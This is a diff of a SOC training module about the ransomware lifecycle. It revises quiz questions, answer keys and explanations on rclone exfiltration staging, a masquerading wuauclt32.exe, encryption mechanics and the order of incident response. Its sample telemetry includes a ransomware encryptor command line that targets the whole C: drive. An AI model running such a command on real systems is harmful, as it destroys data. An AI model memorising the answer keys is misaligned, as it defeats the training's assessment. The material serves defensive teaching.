-            "Treat this as active exfiltration staging tied to the same intrusion as the earlier credential-access finding -- immediately cut off this host's ability to reach the external destination, alert IR now, and do not wait for the encryption stage that Reading 7 explained may not even be the attacker's next move",
-            "Approve the transfer as legitimate, since rclone is a real, commonly-used enterprise tool and its presence alone is sufficient grounds to assume it belongs to an authorized process",
-            "Close the finding without escalation, since \"unverified\" only means the IT ticketing system hasn't been checked yet, not that anything is actually wrong",
+            "Disable j.reyes and reset his password, then let the transfer run under watch to measure exactly what is being taken",
+            "Cut SRV-FILES-04's route to the external destination and alert IR now, as the same intrusion -- encryption may never come",
+            "Escalate to IR but leave network access alone until encryption starts, since containing now would warn the affiliate early",
+            "Ask IT to raise a retroactive change ticket for the job, since \"unverified\" only means nobody has checked the queue yet",
           ],
           answer: 1,
           explanation:
-            "This is exactly the highest-value moment Reading 7 described: staging caught before encryption is the point where the outcome can still change. Waiting for encryption to appear before acting throws away that window entirely, and Reading 7 was explicit that some affiliates skip encryption altogether -- there may be no later, more obvious signal coming at all.",
+            "This is the highest-value moment Reading 7 described: staging caught before encryption is where the outcome can still change, so the outbound path is cut now and IR is alerted. Letting the transfer run to measure it hands the attacker the leverage you are trying to deny -- and disabling the account does not stop an rclone process that is already running. Holding containment until encryption starts throws away the window, and Reading 7 says some affiliates skip encryption altogether. And it_verify_message already shows the check was done: no ticket exists and the only documented backup is Veeam, so a retroactive ticket would paper over an unexplained transfer.",
           xp: 40,
         },
       ],
@@ -643,13 +643,13 @@ const ransomwareLifecycleRoom = {
       id: "rw-ac1",
       heading: "Verdict: An rclone Cloud-Storage Detection on an Archive Server",
       scenario:
-        "Falcon fires a High-severity Exfiltration-to-Cloud-Storage detection on SRV-ARCHIVE-02 -- the exact technique family this room's exfiltration-staging finding on SRV-FILES-04 was just confirmed as a true positive for. Review the detection before deciding whether this one is a true positive or a false positive.",
+        "During the post-incident retro-hunt, the team re-reviews every older Falcon Exfiltration-to-Cloud-Storage detection -- the technique family of the SRV-FILES-04 staging finding confirmed as a true positive earlier in this room. One, from 2 March, fired on SRV-ARCHIVE-02. Before deciding, the analyst opened the config file named by --config in the command line: the sharepoint-nexacorp remote is a OneDrive-type remote bound to the nexacorp.sharepoint.com tenant that NexaCorp IT administers. Review the detection, including the change-management lookup (it_verify) shown under the log, and decide whether this one is a true positive or a false positive.",
       event: migrationRcloneEvent,
       correct_verdict: "false_positive",
       explanation:
-        "crowdstrike.FilePath is C:\\Program Files\\RecordsMigration\\rclone.exe -- a proper installed-software location, not a generic Public folder. crowdstrike.ParentProcessName is MigrationScheduler.exe, a known, documented process, not cmd.exe launched manually. crowdstrike.CommandLine targets a legacy project archive and pushes it to \"sharepoint-nexacorp\" -- NexaCorp's own licensed, recognized SharePoint tenant, not an unrecognized personal cloud remote. crowdstrike.UserName is svc-migrate, a documented service account, not a privileged human account that was just flagged elsewhere in an active incident. And it_verify_result confirms change ticket CHG-40881 authorizing exactly this project, on this host, on this schedule.",
+        "crowdstrike.FilePath is C:\\Program Files\\RecordsMigration\\rclone.exe -- an installed-software location, not a generic Public folder. crowdstrike.ParentProcessName is MigrationScheduler.exe, a scheduler process, not cmd.exe launched by hand. The remote's name alone would prove nothing -- a friendly name is exactly the trap from the SRV-FILES-04 finding -- but the config the analyst opened binds sharepoint-nexacorp to NexaCorp's own administered tenant, nexacorp.sharepoint.com. crowdstrike.UserName is svc-migrate, a service account, not the privileged human account flagged in the active incident. And it_verify_result is confirmed: change ticket CHG-40881 authorises this migration from this host to the company's SharePoint tenant, on this nightly schedule, with svc-migrate as the documented account.",
       fp_trap:
-        "This detection uses the identical technique family -- and the identical tool, rclone -- as the confirmed true-positive exfiltration finding earlier in this room, which makes escalating it on reflex extremely tempting. But the specific fields tell two very different stories: proper install location vs. a generic Public folder, a documented scheduler process vs. manual cmd.exe launch, the org's own recognized SharePoint tenant vs. an unrecognized remote name, a documented migration service account vs. a privileged account already flagged in an active incident, and a confirmed change ticket vs. no ticket at all. Escalating every rclone-to-cloud pattern without checking these fields either buries the SOC in noise on every legitimate backup or migration job, or -- just as dangerously -- teaches the team to stop reading past the tool's name entirely, which is exactly the habit that would let a real exfiltration attempt hide behind a routine-sounding process.",
+        "This detection uses the identical technique family -- and the identical tool, rclone -- as the confirmed true-positive exfiltration finding earlier in this room, which makes escalating it on reflex extremely tempting. But the specific fields tell two very different stories: proper install location vs. a generic Public folder, a scheduler parent vs. manual cmd.exe launch, a destination verified in the config as the company's own tenant vs. an unverified remote from a config dropped in a Public folder, a documented migration service account vs. a privileged account already flagged in an active incident, and a confirmed change ticket vs. no ticket at all. Escalating every rclone-to-cloud pattern without checking these fields either buries the SOC in noise on every legitimate backup or migration job, or -- just as dangerously -- teaches the team to stop reading past the tool's name entirely, which is exactly the habit that would let a real exfiltration attempt hide behind a routine-sounding process.",
       xp: 35,
     },
     // ── Reading 8: Impact, extortion, and the full-chain playbook ────────────
@@ -658,10 +658,10 @@ const ransomwareLifecycleRoom = {
       id: "rw-r8",
       heading: "Impact and Extortion: Encryption Mechanics and the Full-Chain Playbook",
       content:
-        "**How the encryption actually works (T1486).** Production ransomware doesn't encrypt with one slow, crackable algorithm — it uses a fast symmetric cipher (commonly AES or ChaCha20) to encrypt each file's contents quickly at scale, then wraps that per-file or per-host symmetric key with an asymmetric public key (RSA or ECC) baked into the encryptor binary at build time. The matching private key never touches the victim's environment at all — it exists only on the attacker's own infrastructure. This is exactly why 'just recover the key from memory' almost never works at any real scale, and why free public decryptors are genuinely rare: they normally exist only because researchers found an actual implementation flaw in one specific family's build, not because the underlying cryptography itself was ever broken.\n\n" +
+        "**How the encryption actually works (T1486).** Production ransomware doesn't encrypt with one slow, crackable algorithm — it uses a fast symmetric cipher (commonly AES or ChaCha20) to encrypt each file's contents quickly at scale, then wraps that per-file or per-host symmetric key with an asymmetric public key (RSA or ECC) baked into the encryptor binary at build time. The matching private key never touches the victim's environment at all — it exists only on the attacker's own infrastructure. This is exactly why 'just recover the key from memory' almost never works at any real scale, and why free public decryptors are genuinely rare: they normally exist only because researchers found an actual implementation flaw in one specific family's build, or because law enforcement seized or obtained the operators' private keys (as in the Hive and LockBit takedowns) — not because the underlying cryptography itself was broken.\n\n" +
         "**What the moment of impact looks like in telemetry.** A mass, rapid file-modification and rename event from a single process across an enormous number of files in a short window, almost always paired with a new, previously-unseen extension appended to every file it touches, and a note file dropped into common, highly visible locations. Modern EDR platforms specifically watch for this rename-rate spike as a distinct, high-confidence behavioral signature — independent of the specific binary's hash or file name, which is exactly why disguising the binary's name (as this room's own case study shows) slows detection down but does not defeat it.\n\n" +
         "**The extortion note and what follows it.** The note directs the victim toward a negotiation channel — often a Tor-hosted chat portal — and, in a double-extortion case, references a leak site where a sample of the stolen data is already published as proof, with a countdown before the rest goes up. Some groups add further pressure on top of this: contacting the victim's own customers or regulators directly, or threatening a denial-of-service against public-facing systems — a pattern industry reporting sometimes calls triple extortion.\n\n" +
-        "**The full-chain playbook — what the SOC actually does at every stage, not just at the end.**\n\n" +
+        "**The full-chain playbook — what the SOC actually does at every stage, not just at the end** — is laid out stage by stage in the table below this reading: for each stage, the detection point a SOC actually sees and the analyst action that goes with it.\n\n" +
         "**The governance line that closes this room.** Whether to pay a ransom is not a SOC decision. It belongs to executive leadership, legal counsel, often the organization's cyber insurer, and — in many jurisdictions — carries real regulatory and even sanctions-related considerations depending on who the threat actor turns out to be. The SOC's job through every single stage of this room has been to produce the facts that decision actually needs: what got in, what was touched, what was taken, and what is and isn't still actively spreading right now. Producing those facts quickly and accurately is the job. Making the payment call is someone else's.",
       codeExample:
         "Stage              Detection point (what a SOC actually sees)        Analyst action\n" +
@@ -702,42 +702,42 @@ const ransomwareLifecycleRoom = {
           question:
             "crowdstrike.FileName reads wuauclt32.exe and crowdstrike.FilePath reads C:\\Windows\\Temp\\wuauclt32.exe. What is suspicious about this specific name-and-path combination?",
           options: [
-            "Nothing -- Windows Update's client legitimately updates itself from the Temp folder during routine patch cycles, so this is completely ordinary",
-            "The real Windows Update client is named wuauclt.exe and lives in C:\\Windows\\System32, not C:\\Windows\\Temp -- this binary's name is a close-but-not-exact imitation, and its location is a place a genuine system component would never actually run from, both of which are deliberate masquerading choices",
-            "The .exe extension itself is inherently suspicious, since no legitimate Windows system process is ever packaged as a standalone executable file",
-            "wuauclt32.exe cannot be evaluated without first checking whether Windows Temp folders are writable, since writability alone determines whether a file is malicious",
+            "Only the path: wuauclt32.exe is the 32-bit Windows Update client, which belongs under SysWOW64 rather than Windows\\Temp",
+            "The real client is wuauclt.exe in System32; a near-match name running from Windows\\Temp is masquerading in name and location",
+            "Only the account: the name is genuine, but Windows Update runs as the signed-in user, so a SYSTEM-run copy is the anomaly",
+            "Neither is decisive: Windows Update stages its payloads under Windows\\Temp, so only a hash lookup can settle this one",
           ],
           answer: 1,
           explanation:
-            "This is textbook masquerading: a name close enough to a real system process to pass a quick glance (wuauclt.exe vs. wuauclt32.exe), combined with a location -- C:\\Windows\\Temp -- that the genuine Windows Update client never actually runs from. Both details together are the tell, not either one in isolation.",
+            "This is textbook masquerading: a name close enough to a real system process to pass a quick glance (wuauclt.exe vs. wuauclt32.exe), combined with a location -- C:\\Windows\\Temp -- the genuine client never runs from; the two together are the tell. There is no 32-bit wuauclt32.exe -- the 32-bit copy under SysWOW64 keeps the same wuauclt.exe name, so the name itself is wrong, not just the path. Windows Update runs under the system's update service, so SYSTEM is expected and the account is not the anomaly here. And the genuine client does not run from Windows\\Temp; the name and path already answer the question before any hash lookup.",
           xp: 30,
         },
         {
           question:
             "crowdstrike.CommandLine reads: wuauclt32.exe --path C:\\ --ext .a8f2e91c --note RESTORE-FILES-a8f2e91c.txt --skip C:\\Windows,C:\\ProgramData,C:\\$Recycle.Bin --threads 24. What do these specific arguments reveal about the tooling and the affiliate's intent?",
           options: [
-            "Nothing -- these arguments are randomly generated and have no bearing on what the binary actually does when executed",
-            "This is a purpose-built, configurable ransomware binary: it targets the entire C:\\ drive, appends a distinct extension and drops a matching note, and deliberately excludes core system directories -- keeping the host functional enough to boot and actually display the ransom note, rather than indiscriminately destroying the system the way a wiper would",
-            "The --skip flag proves this activity is completely benign, since any tool that avoids the Windows and ProgramData folders is, by definition, not malware",
-            "--threads 24 is a network configuration setting controlling how many VPN tunnels the host can open simultaneously, unrelated to file operations",
+            "A wiper: the random-looking extension shows files are being overwritten, and --skip only delays damage to the boot volume",
+            "A configurable encryptor: all of C:\\, a fixed extension and note, system folders skipped so the host still boots to show it",
+            "A staging tool: --path C:\\ with 24 threads is bulk collection of files for exfiltration before the real encryptor is pushed",
+            "A narrowly targeted encryptor: the --skip list shows it touches only the user data the affiliate already exfiltrated",
           ],
           answer: 1,
           explanation:
-            "Real ransomware encryptors are commonly built with exactly this kind of command-line configurability -- target path, extension, note filename, and directories to skip. The deliberate exclusion of system directories is a functional choice, not a sign of benign intent: a host that can still boot and display the note is more useful to the affiliate's extortion goal than one that's been destroyed outright, which is also the key distinction between ransomware and a wiper.",
+            "Encryptors are commonly built with exactly this configurability -- target path, extension, note filename, and directories to skip. Skipping system directories is functional: a host that still boots and shows the note serves the extortion goal, which is also what separates ransomware from a wiper -- a wiper has no reason to drop a RESTORE-FILES note or protect the OS. Staging comes before Impact and does not add a new extension or drop a note -- both of which this command line does. And --skip lists folders to avoid, not data to target: everything else on C:\\ is in scope, exfiltrated or not.",
           xp: 35,
         },
         {
           question:
-            "crowdstrike.PatternDispositionDescription reads \"Detected, kill process\" -- this specific host was actually blocked, unlike the earlier findings in this room. Given the sixty other near-identical detections firing in the same five minutes mentioned in the context, what should the analyst NOT conclude from this one host being protected?",
+            "crowdstrike.PatternDispositionDescription reads \"Detected, kill process\" -- this specific host was actually blocked, unlike the earlier findings in this room. Given the context (sixty-one detections in five minutes, a scheduled task pushed to more than 140 hosts), what does this one block tell the analyst, and what comes next?",
           options: [
-            "That the incident is now over, since the encryptor was successfully blocked on this specific host",
-            "That every other host targeted by the same scheduled task was necessarily blocked too, since EDR policy and tamper-protection state are always identical across an entire fleet",
-            "That EDR tuning, rollout state, and tamper-protection configuration can genuinely differ host to host -- so this one successful block says nothing about the sixty-plus other near-simultaneous detections, and the very next step is checking which of the roughly 140 targeted hosts were NOT protected",
-            "That this finding can be closed without any further review, since a \"kill process\" disposition always means the entire fleet-wide incident has been fully contained",
+            "The encryptor is now detected fleet-wide, so the other detections were very likely blocked too and the push is largely contained",
+            "The scheduled task is the root cause, so deleting wuauclt32Check from all 140 hosts comes before checking any per-host outcomes",
+            "Protection varies by host, so this block says nothing about the rest; next, find which of the ~140 targeted hosts were not blocked",
+            "This host is safe and can leave scope, since a kill-process disposition means the encryptor never touched any file on it",
           ],
           answer: 2,
           explanation:
-            "Reading 6 already established that tamper protection and tooling state can vary by host -- this single successful block tells the analyst nothing about the other targeted hosts. The correct next step is exactly the host-to-host-variation answer: immediately check the outcome on every other host the same scheduled task reached, not assume uniform protection across the fleet.",
+            "Reading 6 established that tamper protection and tooling state vary by host, so one successful block says nothing about the other targeted hosts -- the next step is finding which of them were not protected. A detection firing does not mean a block: the earlier findings in this room were \"Detected, no action taken\", so assuming the rest were blocked is unsafe. The task fired at 07:00 and the encryptors are already running, so deleting it now does not stop active encryption on unprotected hosts -- outcome-checking and isolation come first. And kill-process stops the binary when the detection fires, which can be after some files were already encrypted, so this host still needs checking.",
           xp: 35,
         },
       ],
@@ -750,7 +750,7 @@ const ransomwareLifecycleRoom = {
         "It's now confirmed: credentials were dumped from an IT workstation, a domain-privileged account staged and exfiltrated roughly 85 GB of the Finance share to an unrecognized cloud remote, and an encryptor has begun running on dozens of hosts -- some successfully blocked by EDR, some not. A ransom note referencing a leak site has appeared. Based on Reading 8's playbook, what is the correct sequence of actions for the SOC right now?",
       options: [
         "Open a negotiation channel through the leak-site portal in parallel with isolation, since the SOC holds the technical detail needed to judge the attacker's proof and can buy the business time",
-        "Network-isolate hosts with active or attempted encryption, scope hit versus merely targeted hosts, preserve evidence, and give IR, legal and executives the blast radius, confirmed exfiltration and IOCs for the payment decision",
+        "Isolate hosts with active or attempted encryption, scope hit vs. merely targeted hosts, preserve evidence, and give IR, legal and executives the blast radius, exfiltration facts and IOCs",
         "Hard power-off every host showing encryption plus the file servers and domain controllers, then rebuild everything from backup, since a full shutdown stops the spread fastest and evidence can be rebuilt from logs",
         "Start restoring the already-encrypted hosts from backup first, since recovery time drives the business impact and containment of the remaining hosts can follow once critical services are running again",
       ],
@@ -764,9 +764,9 @@ const ransomwareLifecycleRoom = {
       type: "flag" as const,
       id: "rw-f1",
       prompt:
-        "Look at the Impact-stage finding on WKS-HR-0233 (the encryptor detection). According to the raw crowdstrike.CommandLine field, what exact file extension does the encryptor append to every file it processes?",
-      answer: ".a8f2e91c",
-      hint: "Look for the --ext argument inside crowdstrike.CommandLine on the WKS-HR-0233 detection.",
+        "An HR user on WKS-HR-0233 reports that C:\\Users\\hr.user\\Documents\\budget.xlsx “changed its name” this morning. Using the encryptor detection on that host, what is the file's full new name? (File name only, no folder path.)",
+      answer: "budget.xlsx.a8f2e91c",
+      hint: "Check whether that folder is excluded, then recall from Reading 8 whether the new extension replaces the old one or is added to it.",
       xp: 25,
     },
   ],
